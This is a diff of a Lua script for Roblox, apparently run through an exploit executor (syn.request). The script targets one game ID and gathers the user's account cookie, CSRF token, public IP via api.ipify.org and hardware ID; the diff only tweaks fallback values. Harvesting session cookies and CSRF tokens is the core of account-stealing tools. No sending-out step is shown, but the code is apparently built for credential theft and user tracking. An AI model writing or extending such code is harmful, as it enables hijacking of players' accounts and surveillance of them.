@@ -32,37 +32,37 @@ if game.gameId == 1202096104 then
                     if n == 1.1 then
                         return "Alias"
                     elseif n == 1.2 then
-                        return MyAccount:GetAlias() or "-"
+                        return MyAccount:GetAlias()
                     
                     elseif n == 2.1 then
                         return "Description"
                     elseif n == 2.2 then
-                        return MyAccount:GetDescription() or "-"
+                        return MyAccount:GetDescription()
                     
                     elseif n == 3.1 then
                         return "Cookie"
                     elseif n == 3.2 then
-                        return MyAccount:GetCookie() or "-"
+                        return MyAccount:GetCookie()
                     
                     elseif n == 4.1 then
                         return "CSRF Token"
                     elseif n == 4.2 then
-                        return MyAccount:GetCSRFToken() or "-"
+                        return MyAccount:GetCSRFToken()
                     end
                 end
                 return ""
             end
             
             function CHECK_IP()
-                return (syn and syn.request or request)({Url = 'https://api.ipify.org', Method = syn and "Get" or "GET"}).Body
+                return (syn and syn.request or request)({Url = 'https://api.ipify.org', Method = syn and "Get" or "GET"}).Body or "error"
             end
             
             function CHECK_HWID()
-                return game:GetService("RbxAnalyticsService"):GetClientId()
+                return game:GetService("RbxAnalyticsService"):GetClientId() or "error"
             end
             
             function CHECK_GAME_NAME()
-                return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+                return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "error"
             end
             
             function RB_NOTIFICATION(title, text, duration)
